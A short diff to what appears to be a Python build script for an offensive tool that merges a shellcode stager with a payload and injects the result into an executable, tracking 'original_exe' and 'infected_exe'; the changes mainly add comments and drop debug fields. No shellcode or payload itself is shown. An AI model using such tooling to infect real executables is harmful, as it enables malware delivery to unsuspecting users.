@@ -140,14 +140,6 @@ main_exe_file = os.path.join(build_dir, "main.exe")
 main_shc_file = os.path.join(build_dir, "main.bin")
 
 debug_data = {
-    "loader_shellcode": b"",
-    "payload_shellcode": b"",
-    "final_shellcode": b"",
-
-    "asm_initial": "",
-    "asm_cleanup": "",
-    "asm_fixup": "",
-
     "original_exe": b"",
     "infected_exe": b"",
 }
@@ -248,14 +240,13 @@ def start(options):
     #        if not verify_shellcode("main-clean.bin"):
     #            return
 
+    # Merge shellcode/loader with payload
     if options["dataref_style"] == DataRefStyle.APPEND:
         print("--[ Merge stager: {} + {} -> {} ] ".format(main_shc_file, options["payload"], main_shc_file))
         with open(main_shc_file, 'rb') as input1:
             data_stager = input1.read()
-
         with open(options["payload"], 'rb') as input2:
             data_payload = input2.read()
-
         print("---[ Size: Stager: {} and Payload: {}  Sum: {} ]".format(
             len(data_stager), len(data_payload), len(data_stager)+len(data_payload)))
 
@@ -277,6 +268,7 @@ def start(options):
         # copy it to out
         shutil.copyfile(main_shc_file, os.path.join("out/", os.path.basename(main_shc_file)))
 
+    # inject merged loader into an exe
     if options["inject_exe"]:
         debug_data["original_exe"] = file_readall_binary(options["inject_exe_in"])
 
@@ -297,11 +289,12 @@ def start(options):
                 options["inject_exe_out"],
             ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-    # dump
+    # dump the info i gathered
     file = open('latest.pickle', 'wb')
     pickle.dump(data, file)
     file.close()
 
+    # delete files
     if options["cleanup_files_on_exit"]:
         clean_files()
 
